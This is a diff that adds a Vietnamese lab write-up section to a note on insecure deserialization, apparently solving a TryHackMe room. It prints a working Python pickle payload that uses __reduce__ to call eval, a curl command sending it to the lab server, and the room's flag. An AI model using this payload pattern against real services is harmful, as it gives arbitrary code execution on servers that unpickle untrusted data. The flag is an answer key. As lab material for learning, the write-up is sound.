@@ -140,6 +140,36 @@ Dấu hiệu nguy hiểm:
 
 ---
 
+## Lab thực hành
+
+"Integrity Lab: Insecure Deserialization" tại `http://10.48.150.155:8002/` — server nhận pickle data base64 từ user và deserialize không có bất kỳ kiểm tra nào.
+
+**Tạo payload:** Pickle cho phép class tự định nghĩa cách deserialize qua `__reduce__`. Khi `pickle.loads()` gặp object này, nó gọi ngay `callable(*args)` — tức là thực thi code tùy ý.
+
+```python
+import pickle, base64
+
+class Exploit:
+    def __reduce__(self):
+        return (eval, ("open('flag.txt').read()",))
+
+print(base64.b64encode(pickle.dumps(Exploit())).decode())
+```
+
+**Gửi payload:**
+
+```bash
+curl -s -X POST http://10.48.150.155:8002/ \
+  --data-urlencode "pickle_data=<base64_output>" \
+  | grep -oE 'THM\{[^}]+\}'
+```
+
+Flag: `THM{INSECURE_DESERIALIZATION}`
+
+Chain exploit: `__reduce__` → `(eval, "open('flag.txt').read()")` → server tự gọi `eval()` → đọc file. Không cần auth, không cần gì ngoài một pickle payload hợp lệ.
+
+---
+
 ## Tham khảo
 
 - OWASP: https://owasp.org/Top10/A08_2021-Software_and_Data_Integrity_Failures/
